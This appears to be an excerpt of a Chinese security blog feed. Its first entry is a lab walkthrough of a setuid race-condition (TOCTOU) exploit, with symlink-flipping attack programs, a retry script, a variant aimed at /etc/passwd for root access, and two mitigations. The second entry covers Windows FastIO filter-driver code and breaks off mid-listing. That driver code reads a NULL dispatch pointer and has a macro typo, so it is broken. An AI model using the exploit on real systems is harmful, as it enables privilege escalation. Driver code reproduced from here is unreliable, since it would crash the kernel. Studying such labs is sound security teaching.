class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  vulp.c  */</span> </span><br><span class="line"></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get user input */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这个程序是一个set-uid程序（文件属主是root），这个程序的功能是将用户的输入，追加到&#x2F;tmp&#x2F;XYZ这个文件。因为程序是拥有root权限，因此在写入操作之前，我们看到程序使用了access函数来检查是否对&#x2F;tmp&#x2F;XYZ文件拥有写入的权限。access()函数用来检查执行程序的用户是否拥有对&#x2F;tmp&#x2F;XYZ文件的写入权限。</p><p>这个过程看起来很完美，用户拥有写入权限时，执行写入操作，用户没有写入权限时不执行操作。然而这个代码的流程却存在竞态条件漏洞。我们假设这样一种情况，&#x2F;tmp&#x2F;XYZ是个软连接，原本指向&#x2F;home&#x2F;test&#x2F;race&#x2F;testfile（文件属主是test用户）,然而access()函数的执行与fopen()函数的执行之间，时间间隔非常长，当test用户运行此程序且access()函数执行之后，&#x2F;tmp&#x2F;XYZ软连接文件被test用户修改，指向了&#x2F;etc&#x2F;shadow（属主是root，其他用户无权限修改）。那么fopen()函数的对象，则变成了&#x2F;etc&#x2F;shadow，攻击者可以成功的向&#x2F;etc&#x2F;shadow文件追加任意内容（程序本身是setuid程序，可以修改&#x2F;etc&#x2F;shadow）。</p><p>这个漏洞从理论上是存在的，然而，我们知道access()和fopen()之间的时间间隔非常短，如何成功的利用这个竞态条件漏洞呢？由于我们使用普通用户，无法修改vulp程序的代码，所以只能变换思路，多次执行vulp程序，并且反复修改&#x2F;tmp&#x2F;XYZ文件的软连接指向的文件。</p><h2 id="利用竟态条件漏洞"><a href="#利用竟态条件漏洞" class="headerlink" title="利用竟态条件漏洞"></a>利用竟态条件漏洞</h2><p>利用此漏洞，我们可以达到下面2种效果：</p><p>1.向任意属主为root的文件追加内容</p><p>2.获取root权限</p><p>在&#x2F;home&#x2F;test&#x2F;race&#x2F;目录下有一个文件rootfile，属主是root。</p><p>  要利用这个漏洞，有这么几个要素：</p><p>  1.&#x2F;tmp&#x2F;XYZ软连接指向的文件不停在属主test和root用户之间切换。</p><p>  2.漏洞程序要反复多次执行。</p><p>  3.漏洞被利用一次之后程序要停止，以免多次写入。</p><p>  对于要素1，我们可以写一个简单的程序，attack.c和testfile</p><p>attack.c：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">          <span class="built_in">system</span>(<span class="string">&quot;ln -sf /home/test/race/testfile /tmp/XYZ&quot;</span>);</span><br><span class="line">          <span class="built_in">system</span>(<span class="string">&quot;ln -sf /home/test/race/rootfile /tmp/XYZ&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>从代码中，我们可以看到，attack这个程序修改&#x2F;tmp&#x2F;XYZ这个软连接所指向的目标文件在testfile和rootfile之间来回切换。</p><p>对于要素三，我们可以写一个脚本来实现确保写入一次。因为写入一次之后，文件的时间戳会改变，因为我们通过检测rootfile的时间戳来判断是否写入成功。脚本check.sh代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">  old=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line">  new=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$old</span>&quot;</span> = <span class="string">&quot;<span class="variable">$new</span>&quot;</span> ]</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">      ./vulp &lt; contents_to_append</span><br><span class="line">      new=`<span class="built_in">ls</span> -l /home/test/race/rootfile`</span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;STOP... The root file has been changed&quot;</span></span><br></pre></td></tr></table></figure><p>从上面代码中我们可以发现，要素二也满足了，我们通过.&#x2F;vulp &lt; contents_to_append来反复执行vulp程序，并且通过重定向来向程序输入我们要追加的内容。</p><p>至此，我们完成攻击所需要的准备步骤都完成了，看一下&#x2F;home&#x2F;test&#x2F;race目录都有哪些文件：</p><p><img src="/.io//image-20240209211251740.png" alt="image-20240209211251740"></p><ul><li>rootfile属主是root，是我们要修改的目标文件。</li><li>testfile属主是test，用来确保通过access()函数的权限检查</li><li>vulp是set-uid程序属主是root，是存在竞态条件漏洞的程序</li><li>contents_to_append属主是test，是我们要向rootfile追加的内容，可以任意修改</li><li>check.sh属主是test，用来反复执行vulp程序并且确保rootfile只修改一次。</li></ul><p>登录实验机，切换到test用户。查看rootfile文件夹，为空。</p><p><img src="/.io//image-20240209211509107.png" alt="image-20240209211509107"></p><p>在执行vulp程序之前，先运行我们的attack程序。</p><p><img src="/.io//image-20240209211534745.png" alt="image-20240209211534745"></p><p>运行check.sh，耐心等待攻击过程完成。</p><p><img src="/.io//image-20240209211834214.png" alt="image-20240209211834214"></p><p>当check.sh结束并打印stop…the root file has been changed时，攻击完成。</p><p>此时cat rootfile，发现写入新内容。可以killall attack关闭程序。</p><h2 id="保护方法"><a href="#保护方法" class="headerlink" title="保护方法"></a>保护方法</h2><p>保护机制A：重复检查权限。想要避免竞态条件的发生并不容易，先检查再访问这个模式在很多程序中都是存在。比起想办法移除漏洞，不如换个思路，我们可以增加更多的竞态条件，这样就能减小攻击者攻击成功的概率了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*嵌套n层*/</span></span><br><span class="line"></span><br><span class="line">        fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br></pre></td></tr></table></figure><p>保护机制B：最小权限原则 该程序的根本问题就在于它违反了最小权限原则，程序员认识到运行这个程序的用户可能权利过大，所以引入access函数进行限制，但也同时引入了竞态条件的隐患。更好的方法是使用seteuid系统调用暂时禁止root权限，当需要时再恢复。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">        FILE *fp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get user input */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="type">uid_t</span> euid = <span class="built_in">geteuid</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">seteuid</span>(<span class="built_in">getuid</span>());</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="built_in">seteuid</span>(euid);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用test用户利用此漏洞获取root权限：</p><p>利用漏洞在 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;shadow 后追加信息。这两个文件是unix做用户授权用的，攻击者有可能利用这点创建用户，甚至是超级用户。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* attack.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">symlink</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">1000</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">symlink</span>(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc attack.c -o attack</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h1 id=&quot;一般溢出&quot;&gt;&lt;a href=&quot;#一般溢出&quot; class=&quot;headerlink&quot; title=&quot;一般溢出&quot;&gt;&lt;/a&gt;一般溢</summary>
      
    
    
    
    <category term="PWN" scheme="https://qianmuoy.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>过滤FastIO</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E8%BF%87%E6%BB%A4FastIO/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E8%BF%87%E6%BB%A4FastIO/</id>
    <published>2024-03-09T12:32:03.000Z</published>
    <updated>2024-03-09T12:32:24.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="过滤FastIO"><a href="#过滤FastIO" class="headerlink" title="过滤FastIO"></a>过滤FastIO</h1><p>过滤驱动就是挂载在一般驱动，比如磁盘驱动上，拦截IRP、FastIO请求，并有选择的过滤。</p><p>FastIO和IRP类似，一般比IRP要复杂，如果对FastIO全部拒绝，可以让驱动走IRP，这也是一般的过滤方法。</p><p><a href="https://zhuanlan.zhihu.com/p/651420427">遍历FSD驱动派遣函数与Hook检测 - 知乎 (zhihu.com)</a></p><p>FSD(File System Drivers)位于系统底层，是和磁盘驱动最近的地方。它平时存在感不强，但由于本身身处要地，所以经常被各种恶意程序、安全软件以及其他怀有各种纯洁和不纯洁目的的应用盯上。</p><h2 id="初始化FastIO派遣例程"><a href="#初始化FastIO派遣例程" class="headerlink" title="初始化FastIO派遣例程"></a>初始化FastIO派遣例程</h2><p>在wdm中有对FAST_IO_DISPATCH的定义，申请一个这样的结构，并填充其中的内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitializeFastIo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    FAST_IO_DISPATCH** FastIoDispatch)</span>   <span class="comment">//这是一个二维指针  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请一个结构指针</span></span><br><span class="line">    FAST_IO_DISPATCH* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    v5 = (PFAST_IO_DISPATCH)<span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(FAST_IO_DISPATCH));</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(v5, <span class="built_in">sizeof</span>(FAST_IO_DISPATCH));</span><br><span class="line">    v5-&gt;SizeOfFastIoDispatch = <span class="built_in">sizeof</span>(FAST_IO_DISPATCH);</span><br><span class="line">    v5-&gt;FastIoCheckIfPossible = FastIoCheckIfPossible;</span><br><span class="line">    v5-&gt;FastIoRead = FastIoRead;</span><br><span class="line">    v5-&gt;FastIoWrite = FastIoWrite;</span><br><span class="line">    v5-&gt;FastIoQueryBasicInfo = FastIoQueryBasicInfo;</span><br><span class="line">    v5-&gt;FastIoQueryStandardInfo = FastIoQueryStandardInfo;</span><br><span class="line">    v5-&gt;FastIoLock = FastIoLock;</span><br><span class="line">    v5-&gt;FastIoUnlockSingle = FastIoUnlockSingle;</span><br><span class="line">    v5-&gt;FastIoUnlockAll = FastIoUnlockAll;</span><br><span class="line">    v5-&gt;FastIoUnlockAllByKey = FastIoUnlockAllByKey;</span><br><span class="line">    v5-&gt;FastIoDeviceControl = FastIoDeviceControl;</span><br><span class="line">    v5-&gt;FastIoDetachDevice = FastIoDetachDevice;</span><br><span class="line">    v5-&gt;FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo;</span><br><span class="line">    v5-&gt;MdlRead = FastIoMdlRead;</span><br><span class="line">    v5-&gt;MdlReadComplete = FastIoMdlReadComplete;</span><br><span class="line">    v5-&gt;PrepareMdlWrite = FastIoPrepareMdlWrite;</span><br><span class="line">    v5-&gt;MdlWriteComplete = FastIoMdlWriteComplete;</span><br><span class="line">    v5-&gt;FastIoReadCompressed = FastIoReadCompressed;</span><br><span class="line">    v5-&gt;FastIoWriteCompressed = FastIoWriteCompressed;</span><br><span class="line">    v5-&gt;MdlReadCompleteCompressed = FastIoMdlReadCompleteCompressed;</span><br><span class="line">    v5-&gt;MdlWriteCompleteCompressed = FastIoMdlWriteCompleteCompressed;</span><br><span class="line">    v5-&gt;FastIoQueryOpen = FastIoQueryOpen;</span><br><span class="line"></span><br><span class="line">    *FastIoDispatch = v5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FastIO派遣例程成员"><a href="#FastIO派遣例程成员" class="headerlink" title="FastIO派遣例程成员"></a>FastIO派遣例程成员</h2><p>首先判断设备对象是否是我们的设备对象，且不对控制设备对象处理。调用绑定的对应函数，这里自身直接返回FALSE。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">FastIoCheckIfPossible</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN CheckForReadOperation,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   BOOLEAN IsOk = FALSE;</span><br><span class="line">   PDEVICE_EXTENSION DeviceExtension = <span class="literal">NULL</span>;</span><br><span class="line">   PFAST_IO_DISPATCH FastIoDispatch = <span class="literal">NULL</span>;  <span class="comment">//指针数组的数组名</span></span><br><span class="line">   PDEVICE_OBJECT    v2 = <span class="literal">NULL</span>;    <span class="comment">//????????????????????????????????????????????</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//判断设备对象是否是我们的设备对象</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">IsOurDeviceObject</span>(DeviceObject))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//我们要获得钩子函数</span></span><br><span class="line">   DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;</span><br><span class="line">   v2 = DeviceExtension-&gt;pFSDeviceObject;  <span class="comment">//FSD设备对象</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">IsControlDeviceObject</span>(DeviceObject) == TRUE)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;   <span class="comment">//如果是控制设备对象</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(FastIoDispatch-&gt;FastIoCheckIfPossible == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;   </span><br><span class="line">   <span class="keyword">if</span> (v2 == <span class="literal">NULL</span> || v2-&gt;DriverObject == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line">   FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch;</span><br><span class="line">   <span class="keyword">if</span> (FastIoDispatch == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line">   IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoCheckIfPossible</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        CheckForReadOperation,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="keyword">return</span> IsOk;   </span><br><span class="line">    <span class="comment">//如果返回false报废当前FastIo请求 执行Irp请求</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以抽出FastIO开始和结束部分</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BEGIN_FAST_IO\</span></span><br><span class="line"><span class="meta">    PDEVICE_EXTENSION DeviceExtension = NULL;\</span></span><br><span class="line"><span class="meta">    PDEVICE_OBJECT v2 = NULL;\</span></span><br><span class="line"><span class="meta">    PFAST_IO_DISPATCH FastIoDispatch = NULL;\</span></span><br><span class="line"><span class="meta">    BOOLEANIsOk = FALSE;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!IsOurDeviceObject(DeviceObject))\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;\</span></span><br><span class="line"><span class="meta">    v2 = DeviceExtension-&gt;pFSDeviceObject;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (IsControlDeviceObject(DeviceObject) == TRUE)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (v2 == NULL || v2-&gt;DriverObject == NULL)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch;\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (FastIoDispatch == NULL)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> END_FAST_IO\</span></span><br><span class="line"><span class="meta">Exit:\</span></span><br><span class="line"><span class="meta">    return IsOk;\</span></span><br></pre></td></tr></table></figure><p>给出余下的FastIO派遣例程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 